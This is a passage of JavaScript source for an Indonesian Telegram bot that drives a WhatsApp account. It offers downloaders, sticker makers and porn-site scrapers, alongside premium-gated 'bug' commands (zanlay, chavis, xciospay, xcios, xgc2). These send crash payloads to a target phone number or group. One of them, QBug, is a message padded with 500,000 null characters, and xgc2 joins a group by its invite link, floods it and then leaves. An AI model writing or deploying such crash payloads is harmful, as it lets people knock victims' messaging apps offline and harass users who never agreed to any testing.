        return ctx.reply(`✅ User ${targetUserId} is already an admin.`);
    }

    addAdmin(targetUserId);
    ctx.reply(`✅ User ${targetUserId} has been added as an admin.`);
});

bot.command('deladmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deladmin <user_id>');
    }

    const targetUserId = args[1];

    if (!isAdmin(targetUserId)) {
        return ctx.reply(`❌ User ${targetUserId} is not an admin.`);
    }

    const wasRemoved = removeAdmin(targetUserId);
    if (wasRemoved) {
        ctx.reply(`✅ User ${targetUserId} has been removed from admins.`);
    } else {
        ctx.reply(`❌ Failed to remove admin ${targetUserId}.`);
    }
}); 
bot.command('listadmin', (ctx) => {
    const adminList = Object.keys(admins);

    if (adminList.length > 0) {
        const details = adminList.map((userId) => `- User ID: ${userId}`).join('\n');
        ctx.reply(`📋 𝙇𝙞𝙨𝙩 𝘼𝙙𝙢𝙞𝙣𝙨\n\n${details}`);
    } else {
        ctx.reply('❌ No admins found.');
    }
});
bot.command('adminfeature', (ctx) => {
    const userId = ctx.from.id;

    if (!isAdmin(userId)) {
        return ctx.reply('❌ This feature is for admins only. Contact the owner for access.');
    }

    ctx.reply('🎉 Welcome to the admin-only feature! Enjoy exclusive benefits.');
});

const cooldowns2 = new Map();

const COOLDOWN_DURATION = 120000;

let isCooldownActive = true;


const cooldownMiddleware = (ctx, next) => {
  const userId = ctx.from.id.toString(); 

 
  if (userId === OWNER_ID || isAdmin(userId)) {
    return next(); 
  }

  if (!isCooldownActive) {
   
    return next();
  }
  if (cooldowns2.has(userId)) {
    const remainingTime = ((cooldowns2.get(userId) + COOLDOWN_DURATION) - Date.now()) / 1000;
    return ctx.reply(`⏳ You must wait ${remainingTime.toFixed(1)} seconds before using this command again.`);
  }

  cooldowns2.set(userId, Date.now());
  
  setTimeout(() => cooldowns2.delete(userId), COOLDOWN_DURATION);

  return next();
};

bot.command('cdmurbug', (ctx) => {
  const args = ctx.message.text.split(' ')[1]?.toLowerCase();
     const userId = ctx.from.id;
 const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID && !isCaywzzaja(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }    
  if (args === 'true') {
    isCooldownActive = true;
    ctx.reply('✅ Cooldown diaktifkan.');
  } else if (args === 'false') {
    isCooldownActive = false;
    ctx.reply('❌ Cooldown dinonaktifkan.');
  } else {
    ctx.reply('⚙️ Gunakan /cdmurbug true untuk mengaktifkan atau /cdmurbug false untuk menonaktifkan.');
  }
});
const process = require('process');
const prosesrespone = (target, ctx) => {
    const videoUrl = 'https://files.catbox.moe/pg5sz1.mp4';
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna";

    const caption = `
<b>⎯⎯⎯⎯⎯⎯⎯  PROSES DIMULAI  ⎯⎯⎯⎯⎯⎯⎯</b>

•  <b>Target</b>     › <code>${target}</code>
•  <b>Peminta</b>    › <i>${senderName}</i>
•  <b>Status</b>     › Proses ( ! )

<blockquote>ちょっと待ってください.</blockquote>

<b>⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯</b>
`;

    const keyboard = [
        [
            { text: "🌸", url: "https://t.me/Garammanis" }
        ]
    ];

    ctx.replyWithVideo({ url: videoUrl }, {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log(chalk.green.bold('(!) Procces Sending.'));
    }).catch((error) => {
        console.error('Error sending process response:', error);
    });
};
const donerespone = (target, ctx) => {
    const videoUrl = 'https://files.catbox.moe/pg5sz1.mp4';
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna";

    const caption = `
<b>⎯⎯⎯⎯⎯⎯⎯  PROSES SELESAI  ⎯⎯⎯⎯⎯⎯⎯</b>

•  <b>Target</b>     › <code>${target}</code>
•  <b>Peminta</b>    › <i>${senderName}</i>
•  <b>Status</b>     › Succes ( ! )

<blockquote>成功する！</blockquote>

<b>⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯</b>
`;

    const keyboard = [
        [
            { text: "🌿", url: "https://t.me/Garammanis" }
        ]
    ];

    ctx.replyWithVideo({ url: videoUrl }, {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log(chalk.green.bold('(!) Done Sending!')); 
    }).catch((error) => {
        console.error('Error sending done response:', error);
    });
};

const kirimpesan = async (number, message) => {
  try {
    const target = `${number}@s.whatsapp.net`;
    await cay.sendMessage(target, {
      text: message
    });
    console.log(`Pesan dikirim ke ${number}: ${message}`);
  } catch (error) {
    console.error(`Gagal mengirim pesan ke WhatsApp (${number}):`, error.message);
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.replyWithPhoto(
      { 
        source: fs.createReadStream('caywzz.jpg') // Ganti sesuai path gambar lu ya
      },
      {
        caption: `
<b><blockquote>(🪐) An error occurred: The bot does not have a sender, please fill in the sender first  </blockquote> </>

`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: "♦️", url: "t.me/zeroscripterz" }
            ],
          ],
        },
      }
    );
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
bot.command("zanlay", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;


    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  
    await delaymakeroverload1(target);
  

  
  await donerespone(target, ctx);
  return ctx.reply('Proses selesai.');
});
bot.command("chavis", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;

      

    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

           await caywzztes(target);
  
  await donerespone(target, ctx);
  
  return ctx.reply('Proses selesai.');
});
bot.command("xciospay", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;


    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  
  for (let i = 0; i < 5; i++) {
           await BugIos(target);
  }

  
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});


bot.command("spotifydownload", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (!args.length) {
    return ctx.reply("❌ Harap masukkan link Spotify!\n\nFormat: `/spotify <url>`", { parse_mode: "Markdown" });
  }

  const url = args[0];
  const apiUrl = `https://api.vreden.my.id/api/spotify?url=${encodeURIComponent(url)}`;

  try {
    const { data } = await axios.get(apiUrl);
    
    if (data.status !== 200 || !data.result.status) {
      return ctx.reply("❌ Gagal mendapatkan informasi lagu. Pastikan link Spotify valid!");
    }

    const { title, artists, releaseDate, cover, music } = data.result;
    
    await ctx.replyWithPhoto(cover, {
      caption: `🎵 *Judul:* ${title}\n🎤 *Artis:* ${artists}\n📅 *Rilis:* ${releaseDate}`,
      parse_mode: "Markdown",
    });

    await ctx.replyWithAudio({ url: music }, { title, performer: artists });

  } catch (error) {
    console.error(error);
    ctx.reply("⚠️ Terjadi kesalahan saat mengambil data. Coba lagi nanti.");
  }
});

bot.command("spotifysearch", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (!args.length) {
    return ctx.reply("❌ Harap masukkan kata kunci pencarian!\n\nFormat: `/spotifysearch <judul lagu>`", { parse_mode: "Markdown" });
  }

  const query = args.join(" ");
  const apiUrl = `https://api.vreden.my.id/api/spotifysearch?query=${encodeURIComponent(query)}`;

  try {
    const { data } = await axios.get(apiUrl);

    if (data.status !== 200 || !data.result.length) {
      return ctx.reply("❌ Lagu tidak ditemukan. Coba dengan kata kunci lain.");
    }

    const results = data.result.slice(0, 5); // Ambil 5 hasil pertama untuk ditampilkan
    for (const track of results) {
      const { title, artist, album, duration, releaseDate, coverArt, spotifyLink } = track;
      
      const keyboard = Markup.inlineKeyboard([
        Markup.button.url("🔗 Buka Spotify", spotifyLink),
        Markup.button.callback("⬇ Download MP3", `download_${spotifyLink}`)
      ]);

      await ctx.replyWithPhoto(coverArt, {
        caption: `🎵 *Judul:* ${title}\n🎤 *Artis:* ${artist}\n💿 *Album:* ${album}\n⏱ *Durasi:* ${duration}\n📅 *Rilis:* ${releaseDate}`,
        parse_mode: "Markdown",
        ...keyboard,
      });
    }

  } catch (error) {
    console.error(error);
    ctx.reply("⚠️ Terjadi kesalahan saat mengambil data. Coba lagi nanti.");
  }
});

bot.action(/^download_(https:\/\/open\.spotify\.com\/track\/.+)$/, async (ctx) => {
  const spotifyUrl = ctx.match[1];
  const apiUrl = `https://api.vreden.my.id/api/spotify?url=${encodeURIComponent(spotifyUrl)}`;

  try {
    await ctx.answerCbQuery("🔍 Sedang mengambil lagu...");

    const { data } = await axios.get(apiUrl);

    if (data.status !== 200 || !data.result.status) {
      return ctx.reply("❌ Gagal mengunduh lagu. Coba lagi nanti.");
    }

    const { title, artists, releaseDate, cover, music } = data.result;

    await ctx.replyWithAudio({ url: music }, { title, performer: artists });

  } catch (error) {
    console.error(error);
    ctx.reply("⚠️ Terjadi kesalahan saat mengambil lagu.");
  }
});

const yts = require("yt-search");
const ytdl = require("ytdl-core");

// Fungsi untuk mengunduh video/audio dari YouTube
async function downloadYouTube(link, asVideo = false) {
    try {
        const info = await ytdl.getInfo(link);
        const format = asVideo
            ? ytdl.chooseFormat(info.formats, { quality: "highestvideo" })
            : ytdl.chooseFormat(info.formats, { quality: "highestaudio" });

        const title = info.videoDetails.title.replace(/[<>:"/\\|?*]+/g, "");
        const fileName = `${title}.${asVideo ? "mp4" : "mp3"}`;
        const filePath = path.join(__dirname, fileName);

        return new Promise((resolve, reject) => {
            ytdl(link, { format })
                .pipe(fs.createWriteStream(filePath))
                .on("finish", () => resolve({ filePath, title }))
                .on("error", reject);
        });
    } catch (error) {
        throw new Error(`Gagal mengunduh: ${error.message}`);
    }
}
async function downloadYouTube(url, format) {
    try {
        const response = await axios.get(`https://youtubedownloader.me/api/download?format=${format}&url=${encodeURIComponent(url)}`, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                "Referer": "https://youtubedownloader.me/"
            }
        });

        const videoId = response.data.id;

        let progress = 0;
        let downloadUrl = null;
        let attempt = 0;

        while (progress < 1000 && attempt < 20) {
            const progressResponse = await axios.get(`https://youtubedownloader.me/api/progress?id=${videoId}`, {
                headers: {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                    "Referer": "https://youtubedownloader.me/"
                }
            });

            progress = progressResponse.data.progress;

            if (progress >= 1000) {
                downloadUrl = progressResponse.data.download_url;
                break;
            }

            attempt++;
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        return downloadUrl;
    } catch (error) {
        console.error(error);
        return null;
    }
}

bot.command('xvid', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); 

    if (!text) {
        return ctx.replyWithPhoto(
            'https://files.catbox.moe/zfeyif.jpg', 
            {
                caption: '*Example:*\n\n`Xvid Colmek`\n\n*Setelah mendapatkan URL, ketik ulang:*\n`Xvid <URL>`',
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.url('♦️', 'https://t.me/Garammanis')]
                ])
            }
        );
    }

    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
    try {
        if (isURL) {
            const result = await xvideosdl(text);
            const { title, url } = result.result;
            const response = await fetch(url);
            const buffer = await response.arrayBuffer();

            await ctx.replyWithVideo({ source: Buffer.from(buffer) }, {
                caption: `🎬 *Title:* ${title}`,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.url('♦️', 'https://t.me/Garammanis')]
                ])
            });

        } else {
            const results = await xvideosSearch(text);
            if (results.length === 0) {
                return ctx.reply('❌ No search results found.', {
                    ...Markup.inlineKeyboard([
                        [Markup.button.url('♦️', 'https://t.me/Garammanis')]
                    ])
                });
            }

            const limitedResults = results.slice(0, 5);
            const searchResults = limitedResults.map((result, index) => {
                return `📌 *${result.title}*\n📏 Duration: ${result.duration}\n🎥 Quality: ${result.quality}\n🔗 [Watch here](${result.url})`;
            }).join('\n\n');

            await ctx.reply(`*Search Results for:* \`${text}\`\n\n${searchResults}`, {
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.url('♦️', 'https://t.me/Garammanis')]
                ])
            });
        }
    } catch (error) {
        console.error(error);
        ctx.reply('❌ Failed to fetch video details.', {
            ...Markup.inlineKeyboard([
                [Markup.button.url('♦️', 'https://t.me/Garammanis')]
            ])
        });
    }
});

bot.command("ytmp3", async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0]) {
        return ctx.reply("Masukkan URL YouTube! Contoh: `/ytmp3 https://youtu.be/example`", { parse_mode: "Markdown" });
    }

    const url = args[0];
    ctx.reply("⏳ Sedang memproses...");

    const downloadUrl = await downloadYouTube(url, "mp3");

    if (downloadUrl) {
        ctx.replyWithAudio({ url: downloadUrl, filename: "audio.mp3" });
    } else {
        ctx.reply("❌ Gagal mendapatkan link download.");
    }
});
const path = require("path");

async function getRule34(tags, limit = 3) {
  try {
    const url = `https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&tags=${encodeURIComponent(tags)}&limit=${limit}`;
    const response = await axios.get(url);
    
    if (!response.data || response.data.length === 0) {
      return [];
    }

    return response.data.map(post => ({
      id: post.id,
      image: post.file_url,
      tags: post.tags,
      source: post.source || "Tidak ada sumber",
      rating: post.rating,
    }));
  } catch (error) {
    console.error("Error fetching Rule34:", error.message);
    return [];
  }
}

bot.command("rule34", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join("_");
  if (!args) {
    return ctx.reply("❌ Harap masukkan tag! Contoh: `/rule34 hatsune_miku`");
  }

  ctx.reply("🔍 Mencari gambar...");

  const results = await getRule34(args, 3);
  if (results.length === 0) {
    return ctx.reply("❌ Tidak ditemukan gambar untuk tag tersebut.");
  }

  for (const post of results) {
    await ctx.replyWithPhoto(post.image, {
      caption: `🔞 Rule34 ID: ${post.id}\nTags: ${post.tags}\n[Source](${post.source})`,
      parse_mode: "Markdown",
    });
  }
});

bot.command('ai', async (ctx) => {
  const text = ctx.message.text.split(' ').slice(1).join(' ');

  if (!text) {
    return ctx.reply(`Masukkan pertanyaan!\n\n*Contoh:* Siapa presiden Indonesia?`);
  }

    let hasil = await useadrenaline(text);

  
  await ctx.replyWithPhoto(
    { url: 'https://files.catbox.moe/6cw5y8.jpg' },
    {
      caption: hasil,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '♦️',
              url: 'https://t.me/Garammanis',
            },
          ],
        ],
      },
    }
  );
});

const axiosInstance = axios.create({
  baseURL: 'https://gke-prod-api.useadrenaline.com/',
  headers: {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'x-instance': 'adrenaline',
  },
});

async function useadrenaline(q) {
  try {
    const data = {
      title: q,
      body: '',
      snippets: [],
      is_rush_enabled: false,
      is_public: false,
      files: [],
    };
    const { data: postResponseData } = await axiosInstance.post('question', data);
    const { data: threadResponseData } = await axiosInstance.get(`thread/${postResponseData.question_id}?page=1&per_page=10`);
    let jobStatus = 'IN_PROGRESS';
    let dataHasil = null;
    while (jobStatus === 'IN_PROGRESS') {
      const { data: answersResponseData } = await axiosInstance.get(`question/${threadResponseData.list[0].question.id}/answers`);
      jobStatus = answersResponseData[0].job_status;
      dataHasil = answersResponseData[0].content;

      if (jobStatus === 'IN_PROGRESS') {
        console.log('Job is still in progress...');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
    return dataHasil;
  } catch (error) {
    console.error(error);
    throw error;
  }
}
bot.command('qc', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    
    if (!text) return ctx.reply('tolong masukan argumen, contoh /qc GaramManiskeren');
    
    
    const obj = {
        type: 'quote',
        format: 'png',
        backgroundColor: '#232023',
        width: 512,
        height: 768,
        scale: 2,
        messages: [{
            entities: [],
            avatar: true,
            from: {
                id: 1,
                name: ctx.from.first_name,
                photo: {
                    url: await ctx.telegram.getUserProfilePhotos(ctx.from.id, { limit: 1 }).then((photos) => {
                        return photos.photos.length > 0 
                            ? photos.photos[0][0].file_id
                            : 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png';
                    }),
                }
            },
            text: text,
            replyMessage: {},
        }],
    };

    try {
        const response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
            headers: {
                'Content-Type': 'application/json',
            },
        });

        const buffer = Buffer.from(response.data.result.image, 'base64');
        const dataUrl = `data:image/png;base64,${buffer.toString('base64')}`;

        // Kirim sticker
        await ctx.telegram.sendSticker(ctx.chat.id, dataUrl);
    } catch (error) {
        console.error('Error generating sticker:', error);
        ctx.reply('Terjadi kesalahan saat membuat sticker.');
    }
});
bot.command("brat", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); 
    if (!text) {
        return ctx.reply("Eitss, Kakak Kurang Kasi Argumen Nya, Tolong Kasi Argumen\n Contoh: /brat starevxz");
    }

    try {
        const res = await getBuffer(`https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`);

        await ctx.replyWithSticker(
            { source: res },
            {
                packname: global.packname || "CaywzzLah", 
                author: global.author || "Starevxz",     
            }
        );
    } catch (error) {
        console.error(error);
        ctx.reply("❌ Terjadi kesalahan saat membuat stiker.");
    }
});
bot.command("bratgif", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); 
    if (!text) {
        return ctx.reply("Eitss, Kakak Kurang Kasi Argumen Nya, Tolong Kasi Argumen\n Contoh: /bratgif starevxz");
    }

    try {
        // Ambil buffer dari API
        const res = await getBuffer(`https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&modeBlur=true&isVideo=true`);

        await ctx.replyWithAnimation(
            { source: res },
            {
                caption: "t.me/zeroscripterz", 
            }
        );
    } catch (error) {
        console.error(error);
        ctx.reply("❌ Terjadi kesalahan saat membuat stiker GIF.");
    }
});

bot.command(['play', 'youtubesearch'], async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply("Masukkan query parameters!");

    ctx.reply("🔍 Sedang mencari...");
    
    try {
        const anu = `https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`;
        const { data: response } = await axios.get(anu);
        
        const url = response.result.url;
        const caption = `🎵 Title: ${response.result.title}\n📜 Description: ${response.result.description}\n👀 Views: ${response.result.views}`;

        ctx.reply(caption, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🎵 Download MP3", callback_data: `ytmp3 ${url}` }],
                    [{ text: "📹 Download MP4", callback_data: `ytmp4 ${url}` }]
                ]
            }
        });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Terjadi kesalahan!");
    }
});

bot.command("ytmp4", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply("Masukkan URL video!");

    ctx.reply("📹 Mengunduh video...");
    
    try {
        const anu = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(text)}`;
        const { data: response } = await axios.get(anu);

        ctx.replyWithVideo({ url: response.data.dl }, { caption: "✅ Download selesai!" });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Gagal mengunduh video.");
    }
});

bot.action(/^ytmp3 (.+)$/, async (ctx) => {
    const url = ctx.match[1];
    ctx.reply(`🔊 Mengunduh MP3 dari ${url}...`);

    try {
        const anu = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(url)}`;
        const { data: response } = await axios.get(anu);

        ctx.replyWithAudio({ url: response.data.dl }, { caption: "✅ Download selesai!" });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Gagal mengunduh audio.");
    }
});

bot.action(/^ytmp4 (.+)$/, async (ctx) => {
    const url = ctx.match[1];
    ctx.reply(`📹 Mengunduh MP4 dari ${url}...`);

    try {
        const anu = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(url)}`;
        const { data: response } = await axios.get(anu);

        ctx.replyWithVideo({ url: response.data.dl }, { caption: "✅ Download selesai!" });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Gagal mengunduh video.");
    }
});

bot.command(["tiktokmp4", "tt", "ttnowm", "tiktoknowm", "tiktok"], async (ctx) => {
    const text = ctx.message.text.split(" ")[1];

    if (!text) {
        return ctx.reply(
            `⚠️ Hmm... kakak belum kasih link nih! 🫣\nCoba ketik kayak gini ya:\n*${ctx.message.text.split(" ")[0]} https://vt.tiktok.com/ZS8KdFQcQ/*\nbiar aku bisa bantu! 🎥✨`,
            { parse_mode: "Markdown" }
        );
    }

    try {
        let anu = await tiktokDownloaderVideo(text);
        let item = 0;

        for (let imgs of anu.data) {
            if (imgs.type === "nowatermark") {
                await ctx.replyWithVideo(
                    { url: imgs.url },
                    {
                        caption: `🎥 *Video Info* :\n📍 Region: ${anu.region}\n⏳ Duration: ${anu.duration}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistik Info* :\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info* :\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info* :\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption* :\n${anu.title || "No Caption"}`,
                        parse_mode: "Markdown",
                    }
                );
            } else if (imgs.type === "photo") {
                if (item === 0) {
                    await ctx.replyWithPhoto(
                        { url: imgs.url },
                        {
                            caption: `🖼️ *Photo Info* :\n📍 Region: ${anu.region}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistik Info* :\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info* :\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info* :\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption* :\n${anu.title || "No Caption"}${
                                ctx.chat.type === "group" && anu.data.length > 1 ? "\n📥 _Sisa foto dikirim ke private chat_\n" : "\n"
                            }`,
                            parse_mode: "Markdown",
                        }
                    );
                } else {
                    await ctx.telegram.sendPhoto(
                        ctx.message.from.id,
                        { url: imgs.url }
                    );
                }
                item += 1;
                await new Promise((resolve) => setTimeout(resolve, 2000));
            }
        }
    } catch (err) {
        console.error(err);
        ctx.reply("⚠️ Gagal mengambil data dari TikTok. Pastikan URL valid atau coba lagi nanti.");
    }
});

bot.command('tiktokmp3', async (ctx) => {
  const text = ctx.message.text.split(' ')[1]; 
  
  if (!text) {
    return ctx.reply('Kamu Harus Memasukan Link URL Nya..');
  }
  
  try {
  
    let anu = await tiktokDownloaderVideo(text);
    let audio = anu.music_info.url;

    await ctx.reply(
      `— TikTok Audio\n\n` +
      `▢  Judul: ${anu.music_info.title || '-'}\n` +
      `▢  Author: ${anu.music_info.author || '-'}\n` +
      `▢  Album: ${anu.music_info.album || '-'}\n\n` +
      `▢  Source: ${text}`
    );

    await ctx.replyWithAudio(
      { url: audio },
      {
        filename: `${anu.music_info.title || 'audio'}.mp3`
      }
    );
  } catch (error) {
    console.error(error);
    await ctx.reply('❌ Terjadi kesalahan saat mengambil audio. Coba lagi nanti, ya!');
  }
});

bot.command(['tiktoksearch', 'tiktoks', 'ttsearch'], async (ctx) => {
  const text = ctx.message.text.split(' ')[1];
  if (!text) {
    return ctx.reply('⚠️ Eits, Salah Itu, Cobalah .tiktoksearch starevxz');
  }

  try {
    let search = await tiktokSearchVideo(text);
    let teks = ` <> ᴛɪᴋᴛᴏᴋ ꜱᴇᴀʀᴄʜ\n\n` +
      `▢  Video ID : ${search.videos[0].video_id}\n` +
      `▢  Username : ${search.videos[0].author.unique_id}\n` +
      `▢  Nickname : ${search.videos[0].author.nickname}\n` +
      `▢  Duration : ${search.videos[0].duration} detik\n` +
      `▢  VT Like : ${search.videos[0].digg_count}\n` +
      `▢  Comment : ${search.videos[0].comment_count}\n` +
      `▢  Share : ${search.videos[0].share_count}\n\n` +
      `▢  Link: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;

    const channelButton = [
      {
        text: '♦️',
        url: `https://t.me/Garammanis`, 
      },
    ];

    await ctx.replyWithVideo(
      `https://tikwm.com${search.videos[0].play}`,
      { 
        caption: teks,
        reply_markup: {
          inline_keyboard: [channelButton] 
        }
      }
    );
  } catch (error) {
    console.log(error);
    ctx.reply('⚠️ Terjadi kesalahan saat mencari video TikTok.');
  }
});
bot.command('xgc2', async (ctx) => {
  const userId = ctx.from.id;
  const text = ctx.message.text.split(" ").slice(1).join(" ");
      if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!text) {
    return ctx.reply(`*Example : https://chat.whatsapp.com/xxxxx*\n*Kalo Mau Forclose, Pasang Jumlah* *.xgc2 https://chat.whatsapp.com/xxx 100*`, { parse_mode: 'Markdown' });
  }

  const [link, amount] = text.split(" ");
  if (!link.includes("whatsapp.com")) {
    return ctx.reply(`Linknya gak valid, coba cek lagi! ❌`);
  }

  const groupLink = link.split("https://chat.whatsapp.com/")[1];
  const bugAmount = amount ? amount : '1';

  try {
    const groupTarget = await cay.groupAcceptInvite(groupLink);

    await prosesrespone(groupTarget, ctx);

    await sleep(2000);
    BugGroup(groupTarget, bugAmount);
    await sleep(2500);

    await donerespone(groupTarget, ctx);

    cay.groupLeave(groupTarget);
  } catch (err) {
    ctx.reply(`Oops, error:\n${err}`);
  }
});
bot.command("xcios",cooldownMiddleware , checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;


    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  
  await prosesrespone(target, ctx);

  for (let i = 0; i < 5; i++) {
           await IosMJ(target, { ptcp: true });
  }

  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});
function searchsfm(query) {
    return new Promise((resolve, reject) => {
        axios.get(`https://sfmcompile.club/?s=${encodeURIComponent(query)}`)
            .then((response) => {
                const $ = cheerio.load(response.data);
                const hasil = [];
                $('#primary > div > div > ul > li > article').each((_, b) => {
                    hasil.push({
                        title: $(b).find('header > h2').text().trim(),
                        link: $(b).find('header > h2 > a').attr('href') || '',
                        category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', '').trim(),
                        share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text().trim(),
                        views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text().trim(),
                        type: $(b).find('source').attr('type') || 'image/jpeg',
                        video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src') || '',
                        video_2: $(b).find('video > a').attr('href') || ''
                    });
                });

                resolve(hasil);
            })
            .catch((error) => reject(error));
    });
}

bot.command('hentaisearch', async (ctx) => {
    const query = ctx.message.text.split(' ').slice(1).join(' ');
    if (!query) {
        return ctx.reply('⚠️ Mohon masukkan keyword pencarian! Contoh: /hentaisearch futanari');
    }

    ctx.reply(`🔍 Mencari "${query}"...`);

    try {
        const results = await searchsfm(query);
        if (results.length === 0) {
